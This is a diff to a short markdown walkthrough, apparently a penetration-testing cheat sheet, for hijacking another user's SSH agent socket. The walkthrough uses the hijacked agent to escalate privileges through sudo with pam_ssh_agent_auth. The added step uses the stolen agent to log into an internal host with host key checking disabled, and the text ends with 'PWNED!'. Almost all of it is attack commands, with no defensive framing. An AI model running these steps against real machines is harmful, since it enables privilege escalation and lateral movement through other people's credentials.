@@ -6,7 +6,7 @@
 
     cat /etc/pam.d/sudo
 
-### File contents
+File contents
 
     auth sufficient pam_ssh_agent_auth.so file=/etc/ssh/sudo_authorized_keys
 
@@ -16,24 +16,28 @@
     @include common-account
     @include common-session-noninteractive
 
-## 2) Check if the user that has signed in has used sudo: 
+### 2) Check if the user that has signed in has used sudo: 
 
     ps aux
 
-## 3) Find an SSH agent socket file fot the shell process we can access: 
+### 3) Find an SSH agent socket file fot the shell process we can access: 
 
     ls -la  /tmp/ssh-WHATEVER/agent.####
 
-## 4) 
+### 4) 
 
     export SSH_AUTH_SOCK=/tmp/ssh-WHATEVER/agent.####
 
-## 5) 
+### 5) 
 
     ssh-add -l
 
-## 6) 
+### 6) 
 
     sudo -l
 
-## 7) PWNED!
+### 7) Authenticate through the hijacked agent
+
+    ssh -o StrictHostKeyChecking=no USER@INTERNAL_IP
+
+### 8) PWNED!
